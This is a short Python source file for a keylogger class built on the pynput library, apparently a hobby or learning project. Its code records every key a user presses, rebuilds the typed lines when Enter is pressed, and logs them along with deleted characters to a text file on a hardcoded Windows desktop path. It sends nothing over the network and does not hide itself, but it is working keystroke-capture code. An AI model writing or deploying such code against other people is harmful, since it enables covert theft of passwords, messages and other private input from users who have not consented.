from pynput import keyboard
import logging
# not used yet
class KeyLogger:
    

    log_dir = r"C:/Users/Samuel/Desktop/"
    logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(message)s', filemode='w')
    def __init__(self):
        self.listener = None

    def init(self):
        self.messageArray = []
        self.outputMessage = ""
        print("running")

        # define which functions to call on press or release
        with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release) as listener:
            listener.join()

        self.listener.start()

     
    def on_press(self, key):
        abc = str(key)
        #abc is char 'a' or 'key.backspace' f.e 
        try:
            print('alphanumeric key {0} pressed'.format(key.char))
            # self.messageArray is an array of strings ['s','t','g'] f.e
            self.messageArray.append(abc)
        except AttributeError:
            # Pressed space, enter, backspace etc...     
            if(abc == 'Key.space'):
                abc.capitalize()
            if(abc == 'Key.space'):
                self.messageArray.append(abc)
            
            if (abc == 'Key.backspace'):
                if (len(self.messageArray) > 0):
                    deletedChar = self.messageArray[-1]
                    print('deleted', deletedChar)
                    logging.info('deleted character: {}'.format(deletedChar))
                    logging.info('New line: {0}'.format(self.messageArray))
                    self.messageArray = self.messageArray[:-1]
                else: 
                    
                    self.outputMessage = ""

            
            if(abc == 'Key.enter'):
                #logging.info('{0} pressed'.format(key))
                # self.outputMessage is a string which will be converted when pressing enter
                self.outputMessage = self.concatenate(self.messageArray)
                print(self.outputMessage)
                logging.info(self.outputMessage)
                self.messageArray = []   
            
    # concatenate() returns a single concatenated string
    def concatenate(self, s):
        print('concatenating...')
        new = "" 
        # traverse in the string  
        for x in s: 
            # remove ', Enter, Space and Backspace
            x = x.replace("'", "").replace("Key.enter", "").replace("Key.space", " ").replace("Key.backspace", "")
            new += x 

        # return string  
        return new 

    def on_release(self, key):
        print('{0} released'.format(key))
        if key == keyboard.Key.esc:
            # Stop listener
            return False

    # Collect events until released
    """
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join() """

def main_program():
    keylogger = KeyLogger()
    keylogger.init()


main_program()
